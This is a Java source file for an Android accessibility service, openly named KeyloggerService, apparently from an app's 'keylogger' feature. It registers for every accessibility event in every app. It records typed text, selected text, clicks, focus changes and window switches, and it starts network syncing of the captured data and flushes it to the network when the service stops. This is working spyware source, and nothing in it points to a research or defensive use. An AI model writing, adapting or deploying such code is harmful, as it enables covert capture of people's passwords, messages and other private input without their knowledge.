package com.fason.app.features.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyloggerService extends AccessibilityService {

    private KeyloggerDataManager dataManager;
    private String currentPackage;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT |
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;

        setServiceInfo(info);

        dataManager = KeyloggerDataManager.getInstance();
        dataManager.startNetworkSync();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || dataManager == null) return;

        int eventType = event.getEventType();
        String packageName = safeString(event.getPackageName());
        String className = safeString(event.getClassName());
        long timestamp = System.currentTimeMillis();

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            currentPackage = packageName;
            dataManager.logEntry(timestamp, "WINDOW_CHANGE", packageName, className,
                "", safeString(event.getText()), "");
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String newText = safeString(event.getText());
            String extra = "from=" + event.getFromIndex()
                + " added=" + event.getAddedCount()
                + " removed=" + event.getRemovedCount();
            dataManager.logEntry(timestamp, "TEXT_CHANGED", packageName, className,
                "", newText, extra);
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                try {
                    if (source.getText() != null) {
                        dataManager.logEntry(timestamp, "TEXT_SELECTION", packageName, className,
                            safeString(source.getViewIdResourceName()),
                            source.getText().toString(), "");
                    }
                } finally {
                    source.recycle();
                }
            }
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            dataManager.logEntry(timestamp, "CLICK", packageName, className,
                "", safeString(event.getText()), "");
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                try {
                    dataManager.logEntry(timestamp, "FOCUS", packageName, className,
                        safeString(source.getViewIdResourceName()), "", "");
                } finally {
                    source.recycle();
                }
            }
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            dataManager.logEntry(timestamp, "SCROLL", packageName, className,
                "", "", "scrollX=" + event.getScrollX() + " scrollY=" + event.getScrollY());
        }
    }

    @Override
    public void onInterrupt() {
        if (dataManager != null) {
            dataManager.flushToNetwork();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (dataManager != null) {
            dataManager.flushToNetwork();
        }
    }

    private String safeString(CharSequence cs) {
        return cs != null ? cs.toString() : "";
    }

    private String safeString(java.util.List<CharSequence> list) {
        if (list == null || list.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : list) {
            if (cs != null) sb.append(cs.toString());
        }
        return sb.toString();
    }
}
